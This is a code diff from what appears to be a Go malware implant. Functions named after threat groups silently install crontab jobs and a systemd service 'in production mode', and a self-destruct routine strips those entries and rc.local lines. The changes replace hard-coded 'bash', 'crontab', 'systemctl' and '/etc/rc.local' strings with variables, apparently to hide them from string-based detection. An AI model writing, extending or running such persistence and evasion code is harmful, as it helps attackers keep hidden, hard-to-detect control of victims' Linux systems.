@@ -30,7 +30,7 @@ func carbanak(hiddenDir string) {
 	}
 
 	// Production mode - execute silently
-	cmd := exec.Command("bash", "-c", fmt.Sprintf("(crontab -l 2>/dev/null; echo '%s') | crontab -", cronJob))
+	cmd := exec.Command(bashBin, shellFlag, fmt.Sprintf("(crontab -l 2>/dev/null; echo '%s') | crontab -", cronJob))
 	if err := cmd.Run(); err != nil {
 		deoxys("carbanak: crontab install failed: %v", err)
 	}
@@ -63,14 +63,14 @@ func lazarus() {
 
 	// Production mode - execute silently
 	// Check if cron job already exists
-	checkCmd := exec.Command("crontab", "-l")
+	checkCmd := exec.Command(crontabBin, "-l")
 	existing, _ := checkCmd.Output()
 	if strings.Contains(string(existing), exe) {
 		return
 	}
 
 	// Add to crontab
-	cmd := exec.Command("bash", "-c", fmt.Sprintf("(crontab -l 2>/dev/null; echo '%s') | crontab -", cronJob))
+	cmd := exec.Command(bashBin, shellFlag, fmt.Sprintf("(crontab -l 2>/dev/null; echo '%s') | crontab -", cronJob))
 	if err := cmd.Run(); err != nil {
 		deoxys("lazarus: crontab install failed: %v", err)
 	}
@@ -158,7 +158,7 @@ func dragonfly() {
 	os.WriteFile(scriptPath, []byte(scriptContent), 0755)
 	os.WriteFile(unitPath, []byte(unitBody), 0644)
 
-	cmd := exec.Command("systemctl", "enable", "--now", unitName)
+	cmd := exec.Command(systemctlBin, "enable", "--now", unitName)
 	if err := cmd.Run(); err != nil {
 		deoxys("dragonfly: systemctl enable failed: %v", err)
 	}
@@ -172,13 +172,13 @@ func nukeAndExit() {
 	deoxys("nukeAndExit: Removing all persistence and self-destructing")
 
 	// 1. Stop and remove systemd service
-	exec.Command("systemctl", "stop", unitName).Run()
-	exec.Command("systemctl", "disable", unitName).Run()
+	exec.Command(systemctlBin, "stop", unitName).Run()
+	exec.Command(systemctlBin, "disable", unitName).Run()
 	os.Remove(unitPath)
-	exec.Command("systemctl", "daemon-reload").Run()
+	exec.Command(systemctlBin, "daemon-reload").Run()
 
 	// 2. Remove cron entries referencing our script or binary
-	if out, err := exec.Command("crontab", "-l").Output(); err == nil {
+	if out, err := exec.Command(crontabBin, "-l").Output(); err == nil {
 		lines := strings.Split(string(out), "\n")
 		var clean []string
 		for _, line := range lines {
@@ -189,16 +189,16 @@ func nukeAndExit() {
 		}
 		filtered := strings.TrimSpace(strings.Join(clean, "\n"))
 		if filtered == "" {
-			exec.Command("crontab", "-r").Run()
+			exec.Command(crontabBin, "-r").Run()
 		} else {
-			cmd := exec.Command("crontab", "-")
+			cmd := exec.Command(crontabBin, "-")
 			cmd.Stdin = strings.NewReader(filtered + "\n")
 			cmd.Run()
 		}
 	}
 
 	// 3. Clean rc.local
-	rcLocal := "/etc/rc.local"
+	rcLocal := rcTarget
 	if data, err := os.ReadFile(rcLocal); err == nil {
 		lines := strings.Split(string(data), "\n")
 		var clean []string
